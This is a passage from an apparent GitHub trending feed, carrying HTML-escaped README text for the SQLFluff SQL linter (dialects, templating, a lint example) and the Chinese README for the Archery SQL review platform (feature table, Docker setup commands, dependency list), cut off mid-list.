&#xA;&lt;p&gt;Although SQL is reasonably consistent in its implementations, there are several different dialects available with variations of syntax and grammar. &lt;strong&gt;SQLFluff&lt;/strong&gt; currently supports the following SQL dialects (though perhaps not in full):&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;ANSI SQL - this is the base version and on occasion may not strictly follow the ANSI/ISO SQL definition&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cloud.google.com/bigquery/&#34;&gt;BigQuery&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.ibm.com/analytics/db2&#34;&gt;Db2&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.exasol.com/&#34;&gt;Exasol&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://hive.apache.org/&#34;&gt;Hive&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mysql.com/&#34;&gt;MySQL&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.oracle.com/en/database/oracle/oracle-database/21/sqlrf/index.html&#34;&gt;Oracle&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.postgresql.org/&#34;&gt;PostgreSQL&lt;/a&gt; (aka Postgres)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.aws.amazon.com/redshift/index.html&#34;&gt;Redshift&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.snowflake.com/&#34;&gt;Snowflake&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://developer.salesforce.com/docs/atlas.en-us.soql_sosl.meta/soql_sosl/sforce_api_calls_soql.htm&#34;&gt;SOQL&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://spark.apache.org/docs/latest/&#34;&gt;SparkSQL&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.sqlite.org/&#34;&gt;SQLite&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.teradata.com/&#34;&gt;Teradata&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/sql/t-sql/language-reference&#34;&gt;Transact-SQL&lt;/a&gt; (aka T-SQL)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;We aim to make it easy to expand on the support of these dialects and also add other, currently unsupported, dialects. Please &lt;a href=&#34;https://github.com/sqlfluff/sqlfluff/issues&#34;&gt;raise issues&lt;/a&gt; (or upvote any existing issues) to let us know of demand for missing support.&lt;/p&gt; &#xA;&lt;p&gt;Pull requests from those that know the missing syntax or dialects are especially welcomed and are the question way for you to get support added. We are happy to work with any potential contributors on this to help them add this support. Please raise an issue first for any large feature change to ensure it is a good fit for this project before spending time on this work.&lt;/p&gt; &#xA;&lt;h2&gt;Templates Supported&lt;/h2&gt; &#xA;&lt;p&gt;SQL itself does not lend itself well to &lt;a href=&#34;https://docs.getdbt.com/docs/viewpoint#section-modularity&#34;&gt;modularity&lt;/a&gt;, so to introduce some flexibility and reusability it is often &lt;a href=&#34;https://en.wikipedia.org/wiki/Template_processor&#34;&gt;templated&lt;/a&gt; as discussed more in &lt;a href=&#34;https://docs.sqlfluff.com/en/stable/realworld.html#modularity&#34;&gt;our modularity documentation&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SQLFluff&lt;/strong&gt; supports the following templates:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://jinja.palletsprojects.com/&#34;&gt;Jinja&lt;/a&gt; (aka Jinja2)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.getdbt.com/&#34;&gt;dbt&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Again, please raise issues if you wish to support more templating languages/syntaxes.&lt;/p&gt; &#xA;&lt;h1&gt;Getting Started&lt;/h1&gt; &#xA;&lt;p&gt;To get started, install the package and run &lt;code&gt;sqlfluff lint&lt;/code&gt; or &lt;code&gt;sqlfluff fix&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ pip install sqlfluff&#xA;$ echo &#34;  SELECT a  +  b FROM tbl;  &#34; &amp;gt; test.sql&#xA;$ sqlfluff lint test.sql --dialect ansi&#xA;== [test.sql] FAIL&#xA;L:   1 | P:   1 | L050 | Files must not begin with newlines or whitespace.&#xA;L:   1 | P:   3 | L003 | First line has unexpected indent&#xA;L:   1 | P:  11 | L039 | Unnecessary whitespace found.&#xA;L:   1 | P:  14 | L039 | Unnecessary whitespace found.&#xA;L:   1 | P:  27 | L001 | Unnecessary trailing whitespace.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Alternatively, you can use the &lt;a href=&#34;https://hub.docker.com/r/sqlfluff/sqlfluff&#34;&gt;&lt;strong&gt;Official SQLFluff Docker Image&lt;/strong&gt;&lt;/a&gt; or have a play using &lt;a href=&#34;https://online.sqlfluff.com/&#34;&gt;&lt;strong&gt;SQLFluff online&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;For full &lt;a href=&#34;https://docs.sqlfluff.com/en/stable/cli.html&#34;&gt;CLI usage&lt;/a&gt; and &lt;a href=&#34;https://docs.sqlfluff.com/en/stable/rules.html&#34;&gt;rules reference&lt;/a&gt;, see &lt;a href=&#34;https://docs.sqlfluff.com/en/stable/&#34;&gt;the SQLFluff docs&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;Documentation&lt;/h1&gt; &#xA;&lt;p&gt;For full documentation visit &lt;a href=&#34;https://docs.sqlfluff.com/en/stable/&#34;&gt;docs.sqlfluff.com&lt;/a&gt;. This documentation is generated from this repository so please raise &lt;a href=&#34;https://github.com/sqlfluff/sqlfluff/issues&#34;&gt;issues&lt;/a&gt; or pull requests for any additions, corrections, or clarifications.&lt;/p&gt; &#xA;&lt;h1&gt;Releases&lt;/h1&gt; &#xA;&lt;p&gt;&lt;strong&gt;SQLFluff&lt;/strong&gt; is in beta phase - expect the tool to change significantly with potentially non-backwards compatible API and configuration changes in future releases. If you would like to join in please consider &lt;a href=&#34;https://raw.githubusercontent.com/sqlfluff/sqlfluff/main/CONTRIBUTING.md&#34;&gt;contributing&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;New releases are made monthly. For more information, visit &lt;a href=&#34;https://github.com/sqlfluff/sqlfluff/releases&#34;&gt;Releases&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;SQLFluff on Slack&lt;/h1&gt; &#xA;&lt;p&gt;We have a fast-growing community &lt;a href=&#34;https://join.slack.com/t/sqlfluff/shared_invite/zt-o1f4x0e8-pZzarAIlQmKj_6ZwD16w0g&#34;&gt;on Slack&lt;/a&gt;, come and join us!&lt;/p&gt; &#xA;&lt;h1&gt;SQLFluff on Twitter&lt;/h1&gt; &#xA;&lt;p&gt;Follow us &lt;a href=&#34;https://twitter.com/SQLFluff&#34;&gt;on Twitter @SQLFluff&lt;/a&gt; for announcements and other related posts.&lt;/p&gt; &#xA;&lt;h1&gt;Contributing&lt;/h1&gt; &#xA;&lt;p&gt;We are grateful to all our &lt;a href=&#34;https://github.com/sqlfluff/sqlfluff/graphs/contributors&#34;&gt;contributors&lt;/a&gt;. There is a lot to do in this project, and we are just getting started.&lt;/p&gt; &#xA;&lt;p&gt;If you want to understand more about the architecture of &lt;strong&gt;SQLFluff&lt;/strong&gt;, you can find &lt;a href=&#34;https://docs.sqlfluff.com/en/latest/architecture.html&#34;&gt;more here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;If you would like to contribute, check out the &lt;a href=&#34;https://github.com/sqlfluff/sqlfluff/issues&#34;&gt;open issues on GitHub&lt;/a&gt;. You can also see the guide to &lt;a href=&#34;https://raw.githubusercontent.com/sqlfluff/sqlfluff/main/CONTRIBUTING.md&#34;&gt;contributing&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>hhyo/Archery</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/hhyo/Archery</id>
    <link href="https://github.com/hhyo/Archery" rel="alternate"></link>
    <summary type="html">&lt;p&gt;SQL 审核查询平台&lt;/p&gt;&lt;hr&gt;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;h1&gt;&lt;a href=&#34;https://archerydms.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Archery&lt;/a&gt;&lt;/h1&gt; &#xA; &lt;p&gt;&lt;a href=&#34;https://gitee.com/rtttte/Archery&#34;&gt;&lt;img src=&#34;https://gitee.com/rtttte/Archery/badge/star.svg?theme=gvp&#34; alt=&#34;star&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/hhyo/Archery/actions/workflows/django.yml&#34;&gt;&lt;img src=&#34;https://github.com/hhyo/Archery/actions/workflows/django.yml/badge.svg?sanitize=true&#34; alt=&#34;Django CI&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/hhyo/archery/releases/&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/release/hhyo/archery.svg?sanitize=true&#34; alt=&#34;Release&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://codecov.io/gh/hhyo/archery&#34;&gt;&lt;img src=&#34;https://codecov.io/gh/hhyo/archery/branch/master/graph/badge.svg?sanitize=true&#34; alt=&#34;codecov&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://img.shields.io/pypi/pyversions/django/&#34;&gt;&lt;img src=&#34;https://img.shields.io/pypi/pyversions/django&#34; alt=&#34;version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://docs.djangoproject.com/zh-hans/3.1/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/django-3.1-brightgreen.svg?sanitize=true&#34; alt=&#34;version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/hhyo/Archery/actions/workflows/docker-image.yml&#34;&gt;&lt;img src=&#34;https://github.com/hhyo/Archery/actions/workflows/docker-image.yml/badge.svg?sanitize=true&#34; alt=&#34;Publish Docker image&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://hub.docker.com/r/hhyo/archery/&#34;&gt;&lt;img src=&#34;https://img.shields.io/docker/pulls/hhyo/archery.svg?sanitize=true&#34; alt=&#34;docker_pulls&#34;&gt;&lt;/a&gt; &lt;a href=&#34;http://github.com/hhyo/archery/blob/master/LICENSE&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/License-Apache%202.0-blue.svg?sanitize=true&#34; alt=&#34;License&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://996.icu&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/link-996.icu-red.svg?sanitize=true&#34; alt=&#34;996.icu&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;a href=&#34;https://archerydms.com/&#34;&gt;文档&lt;/a&gt; | &lt;a href=&#34;https://github.com/hhyo/archery/wiki/FAQ&#34;&gt;FAQ&lt;/a&gt; | &lt;a href=&#34;https://github.com/hhyo/archery/releases/&#34;&gt;Releases&lt;/a&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;img src=&#34;https://images.gitee.com/uploads/images/2019/1110/202317_32bd4a1c_1038040.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;/div&gt; &#xA;&lt;h1&gt;介绍&lt;/h1&gt; &#xA;&lt;p&gt;Archery是&lt;a href=&#34;https://github.com/jly8866/archer&#34;&gt;archer&lt;/a&gt;的分支项目，定位于SQL审核查询平台，旨在提升DBA的工作效率，支持多数据库的SQL上线和查询，同时支持丰富的MySQL运维功能，所有功能都兼容手机端操作&lt;/p&gt; &#xA;&lt;h1&gt;功能清单&lt;/h1&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;   &lt;th&gt;查询&lt;/th&gt; &#xA;   &lt;th&gt;审核&lt;/th&gt; &#xA;   &lt;th&gt;执行&lt;/th&gt; &#xA;   &lt;th&gt;备份&lt;/th&gt; &#xA;   &lt;th&gt;数据字典&lt;/th&gt; &#xA;   &lt;th&gt;慢日志&lt;/th&gt; &#xA;   &lt;th&gt;会话管理&lt;/th&gt; &#xA;   &lt;th&gt;账号管理&lt;/th&gt; &#xA;   &lt;th&gt;参数管理&lt;/th&gt; &#xA;   &lt;th&gt;数据归档&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;MySQL&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;MsSQL&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Redis&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;PgSQL&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Oracle&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;MongoDB&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Phoenix&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ODPS&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ClickHouse&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;√&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;   &lt;td&gt;×&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h1&gt;快速开始&lt;/h1&gt; &#xA;&lt;h3&gt;系统体验&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://demo.archerydms.com&#34;&gt;在线体验&lt;/a&gt;&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;账号&lt;/th&gt; &#xA;   &lt;th&gt;密码&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;archer&lt;/td&gt; &#xA;   &lt;td&gt;archer&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;Docker&lt;/h3&gt; &#xA;&lt;h4&gt;准备运行配置&lt;/h4&gt; &#xA;&lt;p&gt;具体可参考：&lt;a href=&#34;https://github.com/hhyo/Archery/tree/master/src/docker-compose&#34;&gt;https://github.com/hhyo/Archery/tree/master/src/docker-compose&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;启动&lt;/h4&gt; &#xA;&lt;p&gt;下载 &lt;a href=&#34;https://github.com/hhyo/archery/releases/&#34;&gt;Releases&lt;/a&gt;文件，解压后进入docker-compose文件夹&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#启动&#xA;docker-compose -f docker-compose.yml up -d&#xA;&#xA;#表结构初始化&#xA;docker exec -ti archery /bin/bash&#xA;cd /opt/archery&#xA;source /opt/venv4archery/bin/activate&#xA;python3 manage.py makemigrations sql  &#xA;python3 manage.py migrate&#xA;&#xA;#数据初始化&#xA;python3 manage.py dbshell&amp;lt;sql/fixtures/auth_group.sql&#xA;python3 manage.py dbshell&amp;lt;src/init_sql/mysql_slow_query_review.sql&#xA;&#xA;#创建管理用户&#xA;python3 manage.py createsuperuser&#xA;&#xA;#重启服务&#xA;docker restart archery&#xA;&#xA;#日志查看和问题排查&#xA;docker logs archery -f --tail=10&#xA;logs/archery.log&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;访问&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://127.0.0.1:9123/&#34;&gt;http://127.0.0.1:9123/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;手动安装&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/hhyo/archery/wiki/manual&#34;&gt;部署说明&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;运行测试&lt;/h1&gt; &#xA;&lt;pre&gt;&lt;code&gt;python manage.py test -v 3&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;依赖清单&lt;/h1&gt; &#xA;&lt;h3&gt;框架&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/django/django&#34;&gt;Django&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/twbs/bootstrap&#34;&gt;Bootstrap&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jquery/jquery&#34;&gt;jQuery&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;前端组件&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;菜单栏 &lt;a href=&#34;https://github.com/onokumus/metismenu&#34;&gt;metisMenu&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;主题 &lt;a href=&#34;https://github.com/BlackrockDigital/startbootstrap-sb-admin-2&#34;&gt;sb-admin-2&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;编辑器 &lt;a href=&#34;https://github.com/ajaxorg/ace&#34;&gt;ace&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;SQL美化 &lt;a href=&#34;https://github.com/zeroturnaround/sql-formatter&#34;&gt;sql-formatter&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;表格 &lt;a href=&#34;https://github.com/wenzhixin/bootstrap-table&#34;&gt;bootstrap-table&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;表格编辑 &lt;a href=&#34;https://github.com/vitalets/x-editable&#34;&gt;bootstrap-editable&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;下拉菜单 &lt;a href=&#34;https://github.com/snapappointments/bootstrap-select&#34;&gt;bootstrap-select&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;文件上传 &lt;a href=&#34;https://github.com/kartik-v/bootstrap-fileinput&#34;&gt;bootstrap-fileinput&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;时间选择 &lt;a href=&#34;https://github.com/smalot/bootstrap-datetimepicker&#34;&gt;bootstrap-datetimepicker&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;日期选择 &lt;a href=&#34;https://github.com/dangrossman/daterangepicker&#34;&gt;daterangepicker&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;开关 &lt;a href=&#34;https://github.com/Bttstrp/bootstrap-switch&#34;&gt;bootstrap-switch&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Markdown展示 &lt;a href=&#34;https://github.com/markedjs/marked&#34;&gt;marked&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;服务端&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;队列任务 &lt;a href=&#34;https://github.com/Koed00/django-q&#34;&gt;django-q&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;MySQL Connector &lt;a href=&#34;https://github.com/PyMySQL/mysqlclient-python&#34;&gt;mysqlclient-python&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;MsSQL Connector &lt;a href=&#34;https://github.com/mkleehammer/pyodbc&#34;&gt;pyodbc&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Redis Connector &lt;a href=&#34;https://github.com/andymccurdy/redis-py&#34;&gt;redis-py&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;PostgreSQL Connector &lt;a href=&#34;https://github.com/psycopg/psycopg2&#34;&gt;psycopg2&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Oracle Connector &lt;a href=&#34;https://github.com/oracle/python-cx_Oracle&#34;&gt;cx_Oracle&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;MongoDB Connector &lt;a href=&#34;https://github.com/mongodb/mongo-python-driver&#34;&gt;pymongo&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Phoenix Connector &lt;a href=&#34;https://github.com/lalinsky/python-phoenixdb&#34;&gt;phoenixdb&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;ODPS Connector &lt;a href=&#34;https://github.com/aliyun/aliyun-odps-python-sdk&#34;&gt;pyodps&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;ClickHouse Connector &lt;a href=&#34;https://github.com/mymarilyn/clickhouse-driver&#34;&gt;clickhouse-driver&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;SQL解析/切分/类型判断 &lt;a href=&#34;https://github.com/andialbrecht/sqlparse&#34;&gt;sqlparse&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;MySQL Binlog解析/回滚 &lt;a href=&#34;https://github.com/noplay/python-mysql-replication&#34;&gt;python-mysql-replication&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;LDAP &lt;a href=&#34;https://github.com/django-auth-ldap/django-auth-ldap&#34;&gt;django-auth-ldap&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;序列化 &lt;a href=&#34;https://github.com/simplejson/simplejson&#34;&gt;simplejson&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;时间处理 &lt;a href=&#34;https://github.com/paxan/python-dateutil&#34;&gt;python-dateutil&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;功能依赖&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;可视化 &lt;a href=&#34;https://github.com/pyecharts/pyecharts&#34;&gt;pyecharts&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;MySQL审核/执行/备份 &lt;a href=&#34;https://github.com/hanchuanchuan/goInception&#34;&gt;goInception&lt;/a&gt;|&lt;a href=&#34;https://github.com/hhyo/inception&#34;&gt;inception&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;MySQL索引优化 &lt;a href=&#34;https://github.com/Meituan-Dianping/SQLAdvisor&#34;&gt;SQLAdvisor&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;SQL优化/压缩 &lt;a href=&#34;https://github.com/XiaoMi/soar&#34;&gt;SOAR&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Binlog2SQL &lt;a href=&#34;https://github.com/danfengcao/binlog2sql&#34;&gt;binlog2sql&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;My2SQL &lt;a href=&#34;https://github.com/liuhr/my2sql&#34;&gt;my2sql&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;表结构同步 &lt;a href=&#34;https://github.com/hhyo/SchemaSync&#34;&gt;SchemaSync&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;慢日志解析展示 &lt;a href=&#34;https://www.percona.com/doc/percona-toolkit/3.0/pt-query-digest.html&#34;&gt;pt-query-digest&lt;/a&gt;|&lt;a href=&#34;https://github.com/thinkdb/aquila_v2&#34;&gt;aquila_v2&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;大表DDL &lt;a href=&#34;https://github.com/github/gh-ost&#34;&gt;gh-ost&lt;/a&gt;|&lt;a href=&#34;https://www.percona.com/doc/percona-toolkit/3.0/pt-online-schema-change.html&#34;&gt;pt-online-schema-change&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;MyBatis XML解析 &lt;a href=&#34;https://github.com/hhyo/mybatis-mapper2sql&#34;&gt;mybatis-mapper2sql&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;RDS管理 &lt;a href=&#34;https://github.com/aliyun/aliyun-openapi-python-sdk&#34;&gt;aliyun-openapi-python-sdk&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;数据加密 &lt;a href=&#34;https://github.com/luojilab/django-mirage-field&#34;&gt;django-mirage-field&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;贡献代码&lt;/h1&gt; &#xA;&lt;p&gt;可查阅主页的开发计划以及依赖清单，在对应issues中回复认领，或者直接提交PR，感谢你对Archery的贡献&lt;br&gt; 贡献包括但不限于以下方式：&lt;/p&gt; &#xA;&lt;ul&gt; 